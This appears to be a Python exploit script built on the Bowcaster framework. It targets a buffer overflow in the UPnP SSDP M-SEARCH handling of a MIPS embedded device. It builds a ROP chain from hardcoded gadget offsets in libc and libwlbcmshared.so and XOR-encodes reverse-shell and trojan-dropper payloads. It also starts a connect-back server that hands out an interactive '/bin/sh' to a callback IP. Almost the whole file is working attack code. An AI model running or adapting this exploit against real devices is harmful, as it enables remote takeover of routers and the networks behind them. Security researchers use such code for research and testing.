#!/usr/bin/env python

# ******************************************************************************
# ******************************************************************************
# ****************       These files are licensed GPLv2.        ****************
# ******************   See included LICENSE for more info.   *******************
# ******************************************************************************
# ******************************************************************************
# ***********************  From your leet hacking cr3w  ************************
# ******************************                 *******************************
# *********************************    at     **********************************
# ***                                                                       ****
# ***********                http://www.tacnetsol.com                ***********
# **************                                                  **************
# **************MMMMMMMMMMMMMMMMMMMMMMMMMMMWo,:OMMMMMMMMMMMMMMMMMM**************
# **************MMMMMMMMMMMMMMMMMMMMMMMMMMK.    ;MMMMMMMMMMMMMMMMM**************
# **************MMMMMMMMMMMMMMMMMMMMMMMMMMX,''''cMMMMMMMMMMMMMMMMM**************
# **************MMMMMMMMMMMMMMMMMMMMMNxxkWM;    0MMMMMMMMMMMMMMMMM**************
# **************MMMMMMMMMMMMMMMMMMMMM,   cM'    xMMMMMMMMMMMMMMMMM**************
# **************MMMMMMMMMMMMMMMM0.o,.'   :X.    lMMMMMMMMMMMMMMMMM**************
# **************MMMMMMMMMMMMMMMMXcO:.'   ;k     ;MMMMMMMMMMMMMMMMM**************
# **************MMMMMMMMMMMMMMMMXoKc.'   ;x     .MMMMMMMMMMMMMMMMM**************
# **************MMMMMMMMMMMMMMMM0.c..'   ;o     .MMMMMMMMMMMMMMMMM**************
# **************MMMMMMMMMMMMMMMMWOlod'   ;l      O0MMMMMN0MMMMMMMM**************
# **************MMMMMMMMMMMMMMM0lllld;...''......,',:;. .cNMMMMMMM**************
# **************MMMMMMMMMMMMMOlllo:.   ...............,0MMMMMMMMMM**************
# **************MMMMMMMMMMMOllllll;:l;   ,xXX0XXXooooollOMMMMMMMMM**************
# **************MMMMMMMMMOlllc;;'.,.,'   ,oMMKMMMlllllllllOMMMMMMM**************
# **************MMMMMMMOlc;,..'... .''   ,oMMKMMM;,;llllllllkWMMMM**************
# **************MMMMMOl:'.'.....  . .'   ,oMMKMMM;''',clllllllkWMM**************
# **************MMMOl:'.... ..   .  .'   ,oMMKMMM' ..'.'cllllllckW**************
# **************MMdc'....  ..   .   .'   ,oMMKMMM'..  ..',llllllcx**************
# **************MMMXl... ..    .    .'   ,oMMKMMM. .. .....cllcxNM**************
# **************MMMMMXc  .     .    .'   ,oMMKMMM.  .   ....cxNMMM**************
# **************MMMMMMMNl     .     .'   ,oMMKMMM'   .   . oNMMMMM**************
# **************MMMMMMMMMNc   .  .........;xKKMMM.    . .lNMMMMMMM**************
# **************MMMMMMMMMMMNl ...    .....   .cXM.    .lNMMMMMMMMM**************
# **************MMMMMMMMMMMMMN; ....,  . .lkx;  k.   oWMMMMMMMMMMM**************
# **************MMMMMMMMMMMMMK 'k.    ..  oMMKx .;.dWMMMMMMMMMMMMM**************
# **************MMMMMMMMMMMMMN .KWo.      oMMXc .xWMMMMMMMMMMMMMMM**************
# **************MMMMMMMMMMMMMM0. .,''... ',;,  ,NKMMMMMMMMMMMMMMMM**************
# **************MMMMMMMMMMMMMMMMO:.   ...   .:KMMKMMMMMMMMMMMMMMMM**************
# **************MMMMMMMMMMMMMMMMMMMWKOkkx;lWMKMMMKMMMMMMMMMMMMMMMM**************
# **************MMMMMMMMMMMMMMMMMMMMMMMMMMKWMKMMKWMMMMMMMMMMMMMMMM**************
# **************MMMMMMMMMMMMMMMMMMMMMMMMMMMKWKMNXMMMMMMMMMMMMMMMMM**************
# **************MMMMMMMMMMMMMMMMMMMMMMMMMMMMXOXNMMMMMMMMMMMMMMMMMM**************
# **************MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM**************
# ******************************************************************************
# ******************************************************************************
# 
# Copyright (c) 2013 Zachary Cutlip <uid000_at_gmail.com>
#                    Tactical Network Solutions, LLC

import sys
import os
from bowcaster.development.overflowbuilder import OverflowBuffer,SectionCreator
from bowcaster.development.overflowconfig import OverflowConfigGenerator
from bowcaster.servers.connectback_server import ConnectbackServer
from bowcaster.payloads.mips.connectback_payload import ConnectbackPayload
from bowcaster.payloads.mips.trojan_dropper_payload import TrojanDropper
from bowcaster.payloads.mips.trampoline import Trampoline
from bowcaster.encoders.mips import MipsXorEncoder
from bowcaster.common.support import BigEndian
from bowcaster.common.support import Logging

import environment
import msearch_crash
import struct
import socket

CALLBACK_IP=environment.CALLBACK_IP
QEMU=environment.QEMU

logger=Logging(max_level=Logging.DEBUG)

def send_multicast(mcast_addr,mcast_port,data):
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,2)
    sock.sendto(data,(mcast_addr,mcast_port))
    sock.close()

qemu_libwlbcmshared_base=0x40942000
qemu_libc_base=0x4085b000

actual_libc_base=0x2aabe000
actual_libwlbcmshared_base=0x2aba1000


if QEMU:
    libc_base=qemu_libc_base
    libwlbcmshared_base=qemu_libwlbcmshared_base
else:
    libc_base=actual_libc_base
    libwlbcmshared_base=actual_libwlbcmshared_base

badchars=["\x00",0x20,'\r']

SC=SectionCreator(BigEndian,base_address=libc_base,badchars=badchars,logger=logger)

################################################################################
#an address in libwlbcmshared.so
#index in +0x50 is a a pointer that points to itself.
#That pointer + 0x2c is all NULL bytes and
#should cause ssdp_msearch_repsonse() to bail without crashing
################################################################################

section=SC.gadget_section(140,
                          0x1ECBC,
                          base_address=libwlbcmshared_base,
                          description= "upnp_context placeholder.")


################################################################################
#Epilogue in sub_b100 in libwlbcmshared.so  that sets up S1 - S7
################################################################################
section=SC.gadget_section(136,#offset
                          0xB1F8, #rop address
                          base_address=libwlbcmshared_base,
                          description="The epilogue of sub_b100 in libwlbcmshared.so. "+\
                                  "Sets up S1-S7.")

################################################################################
# Sets up (readonly) addr in $s0 that can be dereferenced 
# without crashing the next gadget
################################################################################
section=SC.gadget_section(168, #offset
                          0x1ED10, #rop address
                          base_address=libwlbcmshared_base,
                          description="An addr that can be dereferenced & "+\
                                  "written without crashing.")

################################################################################
#Sets up 3 sec argument to sleep() then jumps to $s4
################################################################################
section=SC.gadget_section(200,
                          0x4B62c,
                          description="Sets up 3 sec arg to sleep(). jumps $s4")

################################################################################
#Loads var_4($sp) into ra, then jr $s2.
#This ensures sleep() returns to an address we control.
################################################################################
section=SC.gadget_section(184,
                          0x380F0,
                          description="load stack data into ra, then jr $s2")


################################################################################
#location of sleep() in libc. set up
#$ra and $a0 before calling.
################################################################################
section=SC.gadget_section(176,
                         0x4FFD0,
                         description="location of sleep() in libc.")

################################################################################
#locate stack. add 0x48+var_30+$sp into $s5, jalr $s6
################################################################################
section=SC.gadget_section(240,
                         0x328F4,
                         description="add offset from $sp into s5, jalr $s6")


################################################################################
#jump into stack. jalr $s5.  This needs to get loaded into the stackfinder's jalr reg
################################################################################
section=SC.gadget_section(192,
                          0x1B1F4,
                          description="Jump into stack via reg $s5. make sure the stackfinder jumps to this gadget.")
                          

connectback_server=ConnectbackServer(CALLBACK_IP,port=8080,startcmd="/bin/sh -i",connectback_shell=True)

#a bunch of arbitrary payloads for testing config importer/exporter
payload1=ConnectbackPayload("1.1.1.1",BigEndian,port=9999)
payload2=ConnectbackPayload(CALLBACK_IP,BigEndian,port=8080)
payload3=Trampoline(BigEndian,1028)
logger.LOG_DEBUG("Trampoline:\n%s" % payload3.pretty_string())
payload4=TrojanDropper("10.10.10.10",BigEndian,port=1234)
payloads=[payload1,payload2,payload3,payload4]

encoded_payload=MipsXorEncoder(payloads,badchars=badchars)

SC.encoded_payload_section(268,encoded_payload,description="encoded connect back payload")


buffer_overflow_string=OverflowBuffer(BigEndian,992,os=SC.os,arch=SC.arch,overflow_sections=SC.section_list,logger=logger)

pretty_msearch=msearch_crash.MsearchCrash(buffer_overflow_string.pretty_string())

print "\n\n"+str(pretty_msearch)+"\n\n"


msearch_string=msearch_crash.MsearchCrash(buffer_overflow_string)

pid=None
if len(sys.argv) > 1:
    search_string=sys.argv[1]
    if "0x" == search_string[0:2]:
        search_string_num=int(search_string,0)
        search_string=struct.pack(">L",search_string_num)

    offset=buffer_overflow_string.find_offset(search_string)
    if(offset < 0):
        print "Couldn't find string %s in the overflow buffer." % search_string
    else:
        print "Found string %s at\noffset: %d" % (search_string,offset)
    sys.exit(0)

overflow_config=OverflowConfigGenerator(buffer_overflow_string)

logger.LOG_DEBUG("Generated config.")
cfg_file=open("./config.ini","wb")
overflow_config.config.write(cfg_file)
cfg_file.close()
open("./overflow_buf.bin","wb").write(str(buffer_overflow_string))